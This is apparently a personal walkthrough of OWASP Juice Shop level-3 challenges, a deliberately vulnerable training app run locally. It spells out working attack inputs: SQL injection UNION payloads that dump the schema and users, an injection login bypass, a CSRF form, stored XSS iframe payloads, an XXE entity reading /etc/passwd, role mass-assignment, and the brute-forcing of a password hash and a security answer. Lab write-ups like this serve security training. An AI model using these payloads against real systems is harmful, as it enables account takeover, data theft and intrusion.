# Juice-Shop - Level 3

## Chalanges' solutions

<hr>

**Name:**         Admin Registration  </br>
**Description:**  Register as a user with administrator privileges.  </br> 
**Category:**     Improper Input Validation   </br>
**Solution:**
<p>

When we login we can see that in the token is set the account role

```json
{"typ":"JWT","alg":"RS256"}{"status":"success","data":{"id":21,"username":"","email":"email@email.com","password":"4297f44b13955235245b2497399d7a93","role":"customer" <- HERE
```

If we, when creating an account we add the json key **role** to the object, we can create an admin account
```
"email":"newadmin@admins.com","password":"123123","passwordRepeat":"123123","role" : "admin", <- HERE
```

</p>
<hr>

**Name:**       Bjoern's Favorite Pet    </br>
**Description:** Reset the password of Bjoern's OWASP account via the Forgot Password mechanism with the original answer to his security question.  </br> 
**Category:**   Broken Authentication     </br>
**Solution:**
<p>

Accessing the **/administration** page we get the Bjoern's email.. well we got 2
```
bjoern.kimminich@gmail.com  
bjoern@owasp.org            <- This works
```
Checking the **Photo wall** we can see an hastag in the cat picture (which we worked befor) that might be the cat name, but it did not work
``` 
zatschi
```

The next thing is to search the web for cat related content posted by him <br>

So i came accross a video where he is demonstrating the juice-shop and he states that he has a family cat named **Zaya**, which is the answer to the secret question <br>
</p>

<hr>

**Name:**        CAPTCHA Bypass    </br>
**Description:** Submit 10 or more customer feedbacks within 10 seconds.    </br> 
**Category:**    Broken Anti Automation     </br>
**Solution:**
<p>

To solve this i made a customer feedback, intercepted in burp and used the repeater to send 10 requests sequentially <br>

I could've used the intruder tab but with the comunity edition it does not send the 10 requests under 10 seconds <br> 

</p>

<hr>

**Name:**        CSRF    </br>
**Description:** Change the name of a user by performing Cross-Site Request Forgery from another origin.    </br> 
**Category:**    Broken Access Control     </br>
**Solution:**
<p>

First we need to see how a user name change is requested to the webserver (below i'll paste only the relevant things for the action)
```
POST /profile HTTP/1.1
Host: localhost:3000

username=waza+here
```

now we just need to use some HTML editor (can be an online one) and create a form to send this request
```html
<form
    action="http://localhost:3000/profile"
    method="POST"
>
    <input type="hidden" name="username" value="ah+shit"/>
    <input type="submit" value="Submit">
</form>
``` 
In this case we need a button to trigger since we will not send to anyone and thus it does not need to trigger automatically <br>

If we are using an online editor, we click it and the request will not work (because we are using a docker and so the request to localhost is forbidden due to security protections), so firefox offers the option to open in a new tab which will work and solve the challenge (since the origin is not the same and the request is processed )

</p>

<hr>

**Name:**        Client-side XSS Protection   </br>
**Description:** Perform a persisted XSS attack with < iframe src="javascript:alert(`xss`)"> bypassing a client-side security mechanism. (This challenge is potentially harmful on Docker!)   </br> 
**Category:**    XSS    </br>
**Solution:**
<p>

The description already show us that we need to bypass a security mechanism. Searching for those we can see some at adresses and cards addition (for orders), wallet charging and also at account creation <br>

In order to test it, i used a payload different than the iframe just to see whether or not it is being stored and rendered
```
<h1>h1_me</h1>
```

I started with the cards and addresses, but the things that are being used which are validated are numeric and they are passed to the webserver as json (which expects a number) having a (probably) exception handler that defaults it to something <br> 

The one i found was using the account creation. To do so, intercept with some proxy (burp for example) and modify the request so the email is actually set to the wanted payload. After that, we need to search for something that displays the email <br>

Clearily the menu account thing does not renders it but, and with prior challenge's solution, we can use the **/administration** panel to view the registered users which, indeed, renders the payload. <br>

Now we just need to send the payload in the challenge's description (**need to escape the quotes**)
```
email :
```

</p>


<hr>

**Name:**        Database Schema   </br>
**Description:** Exfiltrate the entire DB schema definition via SQL Injection.   </br> 
**Category:**    Injection    </br>
**Solution:**
<p>

Although the login form is vulnerable to SQLinjection, extract information from it would be extremmely difficult because the output from it is just one field and is the result from the first query so a **UNION SELECT** would not return anything<br>

Looking around i noticed that searching some product would not trigger a server request, so this might not be vulnerable... well it does not request to the server because the data is already fetched locally. <br>

Using the fetching request we can make custom SQL requests to the server. I'll use burp repeater to tinker around with it <br>

``` 
Original request: GET /rest/products/search?q= HTTP/1.1
Forged request: GET /rest/products/search?q='asd HTTP/1.1

"error": {
    "message": "SQLITE_ERROR: near \"asd\": syntax error",
    "stack": "SequelizeDatabaseError: SQLITE_ERROR: near \"asd\": syntax error\n    at Query.formatError (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:415:16)\n    at Query._handleQueryResponse (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:72:18)\n    at afterExecute (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:246:27)\n    at Statement.errBack (/juice-shop/node_modules/sqlite3/lib/sqlite3.js:14:21)",
    "name": "SequelizeDatabaseError",
    "parent": {
        "errno": 1,
        "code": "SQLITE_ERROR",
        "sql": "SELECT * FROM Products WHERE ((name LIKE '%'asd%' OR description LIKE '%'asd%') AND deletedAt IS NULL) ORDER BY name"
    },
    "original": {
        "errno": 1,
        "code": "SQLITE_ERROR",
        "sql": "SELECT * FROM Products WHERE ((name LIKE '%'asd%' OR description LIKE '%'asd%') AND deletedAt IS NULL) ORDER BY name"
    },
    "sql": "SELECT * FROM Products WHERE ((name LIKE '%'asd%' OR description LIKE '%'asd%') AND deletedAt IS NULL) ORDER BY name"
}
```

So we know that the query is as follows
``` 
SELECT * FROM Products WHERE ((name LIKE '%'asd%' OR description LIKE '%'asd%') AND deletedAt IS NULL) ORDER BY name
```

So we can hijack it like so ([Stack overflow](https://stackoverflow.com/questions/6460671/sqlite-schema-information-metadata) , [Docs](https://sqlite.org/faq.html#q7)) <br>

But, in order for us to make an UNION statement we need to have all queries with the same number of elements (other option is a join but that involves other problems). So, first we need to see how many items the first **SELECT** retrieves (by making a normal and valid request)
``` 
Request: GET /rest/products/search?q=banana
Response: 
"data":[
   {
      "id":6,
      "name":"Banana Juice (1000ml)",
      "description":"Monkeys love it the most.",
      "price":1.99,
      "deluxePrice":1.99,
      "image":"banana_juice.jpg",
      "createdAt":"2021-03-16 15:40:55.694 +00:00",
      "updatedAt":"2021-03-16 15:40:55.694 +00:00",
      "deletedAt":null
   }
]

Number of fields: 9
```

So we need to add padding to the second's select fields to query and display
``` 
Initial query: nothing')) UNION SELECT sql FROM sqlite_master
Padded query (to send): nothing')) UNION SELECT sql,1,2,3,4,5,6,7,8 FROM sqlite_master --

Final query (server side execution): SELECT * FROM Products WHERE ((name LIKE '%nothing')) UNION SELECT sql, 1,2,3,4,5,6,7,8 FROM sqlite_master
``` 

The result is a bit long so i'll leave it in a file in the folder of this .md (**schema.dump**) <br>

**Note**: the **nothing** in the query serves the purpose of returning an empty products list 

</p>

<hr>

**Name:**        Deluxe Fraud   </br>
**Description:** Obtain a Deluxe Membership without paying for it.   </br> 
**Category:**    Improper Input Validation    </br>
**Solution:**
<p>

After playing around with the options to pay for the deluxe membership, i did not found any loophole so i can become a member without paying. But, before that i had an **ideia**: what if in the previous page (**/deluxe-membership**), i send a POST request instead of a GET and voila, the server returned a deluxe-membership token

```json
{
    "status":"success",
    "data":{
        "confirmation":"Congratulations! You are now a deluxe member!",
        "token":"i removed the token, too long"
    }
}
```

</p>

<hr>

**Name:**        Forged Review   </br>
**Description:** Post a product review as another user or edit any user's existing review.   </br> 
**Category:**    Broken Access Control    </br>
**Solution:**
<p>

Well, this is pretty straight forward, just intercept the **PUT** request and change the **author** field

</p>

<hr>

**Name:**         Forged Feedback  </br>
**Description:**  Post some feedback in another users name.  </br> 
**Category:**     Broken Access Control   </br>
**Solution:**
<p>

Same as the above but in this case it is a **POST** request and we need to modify the **UserId** field (using any other number)

</p>


<hr>

**Name:**        GDPR Data Erasure   </br>
**Description:** Log in with Chris' erased user account.   </br> 
**Category:**    Broken Authentication    </br>
**Solution:**
<p>

Well, to solve this we inherently solve other challenge (from **level 4** ) because we need to dump all the users table. We can already see from its schema that something is wrong because there is a field named **deletedAt** which indicates that the data is not actually deleted <br>

``` 
"CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `username` VARCHAR(255) DEFAULT '', `email` VARCHAR(255) UNIQUE, (..) , `deletedAt` DATETIME) <--- HERE
```

So if we use the same approach as the above challenge (to dump the schema), with a **UNION SELECT**, we can see the emails in the search response
```
Request: nothing')) UNION SELECT email,2,3,4,5,6,7,8,9 FROM Users --
```

In the middle of the response (wich is embedded in the products fields) we can see Chris's e-mail
```
(...)
"id":14,
"name":"chris.pike@juice-sh.op",
(...)
```
So, to solve this, just make use of the SQLinjection in the login page as so
```
email:chris.pike@juice-sh.op' --
password: something here
```

</p>

<hr>

**Name:**        Login Amy   </br>
**Description:** Log in with Amy's original user credentials. (This could take 93.83 billion trillion trillion centuries to brute force, but luckily she did not read the "One Important Final Note")   </br> 
**Category:**    Sensitive Data Exposure    </br>
**Solution:**
<p>

First we need her email (from previous challenge Users table dump ), and we can also retrieve the password hash
```
Email: amy@juice-sh.op
Hash: 030f05e45e30710c3ad3c32f00de0473
```

Using crackstation did not provided any result for it <br> After being a bit stuck, i saw one hint that lead to [this](https://www.grc.com/haystack.htm?id) page <br>

Considering that Amy did not read the **One Important Final Note**, it is safe to assume that the password follows the same style as the one shown in the page
```
D0g.....................
```

The password is so composed by
```
[A-Z][0-9][a-z](dots)
```

We can create a quick python script (in this notes' repo folder) that test each of this because the search space is rather small. To do so, we digest the concatenation of the test string and compare to the hash stored in the database.  <br>

This is way faster than interact with the login api <br>

```
Trying: K1f.....................        [Collision FOUND]
```

</p>


<hr>

**Name:**        Login Bender   </br>
**Description:** Log in with Bender's user account.   </br> 
**Category:**    Injection   </br>
**Solution:**
<p>

We can use the same approach as before with the sqlinjection, we just need the email from the dump
```
Email: bender@juice-sh.op
Email login field: bender@juice-sh.op' --
Passowrd login field: something
```

</p>

<hr>

**Name:**        Login Jim   </br>
**Description:** Log in with Jim's user account.   </br> 
**Category:**    Injection    </br>
**Solution:**
<p>

Same as the above challenge

```
Email: jim@juice-sh.op
Email login field: jim@juice-sh.op' --
Passowrd login field: something
```

</p>


<hr>

**Name:**         Manipulate Basket  </br>
**Description:**  Put an additional product into another user's shopping basket.  </br> 
**Category:**     Broken Access Control   </br>
**Solution:**
<p>

To find the vulnerability here i had to use the source code because i have no experience with it and didnt knew it is **"common"** <br>

So, in the source code we have
``` 
const result = utils.parseJsonCustom(req.rawBody)

(...)
for (let i = 0; i < result.length; i++) {
    if (result[i].key === 'ProductId') {
        productIds.push(result[i].value)
    } else if (result[i].key === 'BasketId') {
        basketIds.push(result[i].value)
    } else if (result[i].key === 'quantity') {
        quantities.push(result[i].value)
    }
}
(...)

if (user && basketIds[0] && basketIds[0] !== 'undefined' && user.bid != basketIds[0]) {
      res.status(401).send('{\'error\' : \'Invalid BasketId\'}')
} else {
    const basketItem = {
        ProductId: productIds[productIds.length - 1],
        BasketId: basketIds[basketIds.length - 1],
        quantity: quantities[quantities.length - 1]
    }
```

It is exploitable because:
1. it parses the POSTed data
2. Fills 3 lists blindly (which results in having more items in the list)
3. Checks if the user is the same as the first **basketId** parsed (direct id mapping, userId == basketId)
4. If they are, it now fetches from the end of the list based on the length!

So, we just need to modify the POST data as shown below (so the fetched BasketId for the item addition is made from the end of the list)
```
{
    "ProductId":24,
    "BasketId":"6",
    "quantity":1,
    "BasketId":"1"
}
```

Little caveat is that it does not allow for BasketId's greater than the used account one 

</p>

<hr>

**Name:**        Payback Time   </br>
**Description:** Place an order that makes you rich.   </br> 
**Category:**    Improper Input Validation    </br>
**Solution:**
<p>

The solution for this is pretty neat, i heard about it some time ago in a DEFCON talk an remembered it right away <br>

If we based our approach in the previous challenge, we can see that the quantity for the basket's items are also used in the same way 
1. Fetch blindly
2. Access last element fetched

For this i used the functionality to change quantities in the basket. We can leverage it if we append a **quantity** key with a huge negative value
```
{
    "quantity":1,
    "quantity":-999999
}
```

So now, and since the ammount to pay is less than the available in our digital wallet (which is 0), we can pay the order with the digital wallet and the application puts the diference in it. Because we have something like **wallet = wallet - order_value** we have a deposit in it
```
wallet = 0 - (-999999) <=> wallet = 999999
```

The value is not exactly that because it may be doing some other stuff to it (or have a limit), but the idea is valid

</p>


<hr>

**Name:**        Product Tampering   </br>
**Description:** Change the href of the link within the OWASP SSL Advanced Forensic Tool (O-Saft) product description into https://owasp.slack.com.   </br> 
**Category:**    Broken Access Control    </br>
**Solution:**
<p>

To solved this i used the SQLinjection available to search for the product ID
```
Query: nothing')) UNION SELECT id,description,3,4,5,6,7,8,9 FROM Products WHERE name = "OWASP SSL Advanced Forensic Tool (O-Saft)" --

Id: 9
Description: (forgot to copy the original, sorry)
```

I also tried to nest UPDATE and SELECT statements, to modify the description, but without success <br>

Then i went searching for some methods of updating products and, because i did not found, i tried to see if there were more roles beside the **customer** and **admin**<br>

Turns out that there is an **accounting** role which has access to the **/accounting** page. In this page, it is possible to manipulate the products' prices with the following request
``` 
PUT /api/Products/9
{"price" : value_here }
```

So i went and changed the product id we found before and changed its description with the following data
```json
{
    "description":"O-Saft is an easy to use tool to show information about SSL certificate and tests the SSL connection according given list of ciphers and various SSL configurations. <a href=\"https://owasp.slack.com\">More...</a>"
}
```

That what was supposed to be but it was not working because the creator had the fantastic idea of needing something else to validate the challenge (which is not even mentioned in the description). The href must contain a **target=blank** attribute
```json
{
    "description":"O-Saft is an easy to use tool to show information about SSL certificate and tests the SSL connection according given list of ciphers and various SSL configurations. <a href=\"https://owasp.slack.com\" target=\"_blank\">More...</a>"
}
```

</p>

<hr>

**Name:**        Privacy Policy Inspection   </br>
**Description:** Prove that you actually read our privacy policy.   </br> 
**Category:**    Security through Obscurity   </br>
**Solution:**
<p>

Reading the Privacy policy does not seem to provide any valuable information right away. From the hints we can see **It is fine to use the mouse cursor to not lose sight of the paragraph you are currently reading.** <br>

Passing the cursor through the text we can see that a class **hot** is used to highlight some parts of the text.
``` 
http://localhost/
we may also
instruct you
to refuse all
reasonably necessary
responsability
```

Based on the first "hot" text, we can deduce that it is probably a page but none of them (individually) produce result <br>

The solution comes when all of them are merged as followed
```
http://localhost:3000/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility
```

</p>

<hr>

**Name:**        Reset Jim's Password   </br>
**Description:** Reset Jim's password via the Forgot Password mechanism with the original answer to his security question.   </br> 
**Category:**    Broken Authentication    </br>
**Solution:**
<p>

Lets start by getting the email. I got it from a product review but could've used the SQLinjection
```
jim@juice-sh.op
```

Now, lets check the security question
```
Your eldest siblings middle name?
```

Since i didnt knew anything about this dude, i just tried to brute force with a wordlist of middle names. A quick python script with a sleep (because it has a rate limit) sufficies and is in this notes' folder

```
[TRYING 100] Samuel	MATCH
```

The security answer could also been reached by looking further on the products reviews. In on of them there's a Jim's post that says
```
Looks so much better on my uniform than the boring Starfleet symbol.
```

If we search for **Jim starfleet** we have a correspondence for **James T. Kirk** <br>

To get the siblings' names just search for **James T. Kirk siblings** and there is all the names in his family <br>

```
George Kirk (father) 
Winona Kirk (mother) 
George Samuel Kirk (brother) <---- Here it is
Tiberius Kirk (grandfather) 
James (maternal grandfather) 
Aurelan Kirk (sister-in-law) 
Peter Kirk (nephew) 
```

</p>


<hr>

**Name:**        Upload Size   </br>
**Description:** Upload a file larger than 100 kB.   </br> 
**Category:**    Improper Input Validation    </br>
**Solution:**
<p>

To solve this it is actually pretty easy since the verification is made on client-side with javascript <br>

I intercepted the request and pasted the wordlist used in the previous challenge (which had the perfect size 103kb). After that just need to forward a couple of requests to complete the upload <br>

</p>

<hr>

**Name:**         Upload Type  </br>
**Description:**  Upload a file that has no .pdf or .zip extension.  </br> 
**Category:**     Improper Input Validation   </br>
**Solution:**
<p>

This challenge is pretty much the same as before but here we need to convert the bytes to base64 (in order to send paste it in the body). You might just need to change the extension and the content type but i did like this and became solved <br>

I used [this](https://www.motobit.com/util/base64-decoder-encoder.asp) to get the b64 encoded jpg. Then i changed the request (the file portion) as below

```
Content-Disposition: form-data; name="file"; filename="asd.jpg"
Content-Type: image/jpg
```

</p>

<hr>

**Name:**         XXE Data Access  </br>
**Description:**  Retrieve the content of C:\Windows\system.ini or /etc/passwd from the server. (This challenge is potentially harmful on Docker!)  </br> 
**Category:**     XXE   </br>
**Solution:**
<p>

To solve this we need to upload an **.xml** file with an external entity through the same page as before (**/complaints**). This is a follow-up on the B2B deprecated api that we ended up discovering that some functionalities still valid (like uploading **.xml** files) <br>

The file just need to have the normal structure and an External entity that referes to SYSTEM and loads the **/etc/passwd** file
```xml
<?xml version="1.0"?>
<!DOCTYPE parseMeBitch [<!ENTITY pwned SYSTEM "file:///etc/passwd">]>
<something>
    <here> &pwned; </here>
</something>
```

</p>

<hr>

**Name:**        API-only XSS   </br>
**Description:** Perform a persisted XSS attack with < iframe src="javascript:alert(`xss`)"> without using the frontend application at all. (This challenge is potentially harmful on Docker!)   </br> 
**Category:**    XSS    </br>
**Solution:**
<p>

To solve this challenge we need to perform some API call that modifies some content that does not triage the user input and blindly renders it <br>

We already saw that the username is a way of storing XSS but this challenge does not accept it as answer (even through the API). Searching for more, found the product description as being vulnerable because of the below request to **/api/Products/1** (PUT request)

```json
{
    "price":"5",
    "description":"<b>testing this </b>"
}
```

We have the product description bolded out, so using the supplied payload, we got it

```json
{
    "price":"5",
    "description":"<iframe src=\"javascript:alert(`xss`)\">"
}
```

</p>
